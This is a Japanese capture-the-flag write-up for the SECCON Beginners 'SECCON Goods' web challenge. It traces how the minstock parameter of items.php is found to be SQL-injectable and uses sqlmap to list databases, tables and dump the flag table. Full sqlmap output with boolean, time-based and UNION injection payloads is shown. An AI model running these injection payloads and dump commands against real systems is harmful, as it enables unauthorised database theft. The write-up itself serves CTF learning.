# SECCON Goods

## Question

SECCON ショップへようこそ！在庫情報はこちらをご覧ください。

[http://goods.chall.beginners.seccon.jp](http://goods.chall.beginners.seccon.jp)

## Answer

ソースコードを見ると

```html
<table>
  <thead>
    <tr>
      <th v-for="column in columns"> {{ column }}</th>
    </tr>
  </thead>
  <tbody>
    <tr v-for="item in items">
      <td> {{ item.name  }}  </td>
      <td> {{ item.description  }}  </td>
      <td> {{ item.price  }}  </td>
      <td> {{ item.stock  }}  </td>
    </tr>
  </tbody>
</table>
```

こんな感じにテンプレートがそのまま書いてあるのでこれは`js/init.js`によって表示されてるとわかる

[init.js](init.js)

```js
vm = new Vue({
    el: '#view_root',
	data: {
        columns: {name:"商品名", description:"説明", price:"価格", stock:"在庫"},
        items: [{name: "Now loading", description: "Now loading", price: "0 YEN", stock: "0"}],
	},
    mounted(){
        axios.get('/items.php?minstock=0')
            .then(function (response) {
                console.log(vm.$data);
                vm.$data.items = response.data;
            })
            .catch(function (error) {
                console.log(error);
            });
    }
})
```

どうやら
[http://goods.chall.beginners.seccon.jp/items.php?minstock=0](http://goods.chall.beginners.seccon.jp/items.php?minstock=0)
にアクセスしてデータを取得してるみたい

`GET`パラメーターの`?minstock`は最小の在庫を表してるよう

ここに`3`とかやると`3`以上の在庫を持つ商品のみ返してくる

これ以外にこの問題で怪しいところはないので、このパラメータによって`SQL Injection`が行える可能性が高い

`SQL Injection`は[sqlmap](https://github.com/sqlmapproject/sqlmap)で確認できる

```plain
$ sqlmap -u "http://goods.chall.beginners.seccon.jp/items.php?minstock=0"
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.6#pip}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 11:20:50

[11:20:50] [INFO] testing connection to the target URL
[11:20:51] [INFO] testing if the target URL content is stable
[11:20:52] [INFO] target URL content is stable
[11:20:52] [INFO] testing if GET parameter 'minstock' is dynamic
[11:20:52] [INFO] confirming that GET parameter 'minstock' is dynamic
[11:20:52] [INFO] GET parameter 'minstock' is dynamic
[11:20:52] [INFO] heuristic (basic) test shows that GET parameter 'minstock' might be injectable
[11:20:52] [INFO] testing for SQL injection on GET parameter 'minstock'
[11:20:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:20:52] [INFO] GET parameter 'minstock' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[11:20:52] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
[11:20:55] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[11:20:55] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[11:20:55] [INFO] testing 'MySQL inline queries'
[11:20:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[11:20:55] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                      
[11:21:56] [INFO] GET parameter 'minstock' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[11:21:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:21:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:21:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[11:21:56] [INFO] target URL appears to have 5 columns in query
[11:21:57] [INFO] target URL appears to be UNION injectable with 5 columns
[11:21:57] [INFO] GET parameter 'minstock' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'minstock' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
---
Parameter: minstock (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: minstock=0 AND 5214=5214

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: minstock=0 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: minstock=0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7176706b71,0x7146575868696851497751554f6f43734c65555263796a686163486e4b59597168524c6b4e4d7249,0x716b7a6271)-- quye
---
[11:22:07] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 7.2.0
back-end DBMS: MySQL >= 5.0.12
[11:22:07] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/goods.chall.beginners.seccon.jp'

[*] shutting down at 11:22:07
```

これで、`minstock`に`SQL Injection`の脆弱性があることがわかった

次にどんなデータベースがあるかを調べる

```plain
$ sqlmap -u "http://goods.chall.beginners.seccon.jp/items.php?minstock=0" --dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.6#pip}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 11:24:59

[11:24:59] [INFO] resuming back-end DBMS 'mysql' 
[11:24:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: minstock (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: minstock=0 AND 5214=5214

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: minstock=0 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: minstock=0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7176706b71,0x7146575868696851497751554f6f43734c65555263796a686163486e4b59597168524c6b4e4d7249,0x716b7a6271)-- quye
---
[11:24:59] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 7.2.0
back-end DBMS: MySQL >= 5.0.12
[11:24:59] [INFO] fetching database names
available databases [2]:
[*] app
[*] information_schema

[11:24:59] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/goods.chall.beginners.seccon.jp'

[*] shutting down at 11:24:59
```

`app`と`information_schema`というデータベースがあることがわかる

`app`にあるテーブルをみてみる

```plain
$ sqlmap -u "http://goods.chall.beginners.seccon.jp/items.php?minstock=0" --tables -D "app"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.6#pip}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 11:26:53

[11:26:53] [INFO] resuming back-end DBMS 'mysql' 
[11:26:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: minstock (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: minstock=0 AND 5214=5214

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: minstock=0 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: minstock=0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7176706b71,0x7146575868696851497751554f6f43734c65555263796a686163486e4b59597168524c6b4e4d7249,0x716b7a6271)-- quye
---
[11:26:53] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 7.2.0
back-end DBMS: MySQL >= 5.0.12
[11:26:53] [INFO] fetching tables for database: 'app'
Database: app
[2 tables]
+-------+
| flag  |
| items |
+-------+

[11:26:53] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/goods.chall.beginners.seccon.jp'

[*] shutting down at 11:26:53
```

おっ、テーブル`flag`がある

中をみてみよう

```plain
$ sqlmap -u "http://goods.chall.beginners.seccon.jp/items.php?minstock=0" --dump -D "app" -T "flag"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.6#pip}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 11:28:40

[11:28:40] [INFO] resuming back-end DBMS 'mysql' 
[11:28:40] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: minstock (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: minstock=0 AND 5214=5214

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: minstock=0 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: minstock=0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7176706b71,0x7146575868696851497751554f6f43734c65555263796a686163486e4b59597168524c6b4e4d7249,0x716b7a6271)-- quye
---
[11:28:40] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 7.2.0
back-end DBMS: MySQL >= 5.0.12
[11:28:40] [INFO] fetching columns for table 'flag' in database 'app'
[11:28:40] [INFO] fetching entries for table 'flag' in database 'app'
[11:28:40] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[11:28:40] [INFO] used SQL query returns 1 entries
[11:28:40] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[11:28:40] [INFO] fetching number of entries for table 'flag' in database 'app'
[11:28:40] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:28:40] [INFO] retrieved: 1
[11:28:41] [INFO] retrieved: ctf4b{cl4551c4l_5ql_1nj3c710n}
Database: app
Table: flag
[1 entry]
+--------------------------------+
| flag                           |
+--------------------------------+
| ctf4b{cl4551c4l_5ql_1nj3c710n} |
+--------------------------------+

[11:28:48] [INFO] table 'app.flag' dumped to CSV file '/home/user/.sqlmap/output/goods.chall.beginners.seccon.jp/dump/app/flag.csv'
[11:28:48] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/goods.chall.beginners.seccon.jp'

[*] shutting down at 11:28:48
```

`ctf4b{cl4551c4l_5ql_1nj3c710n}`

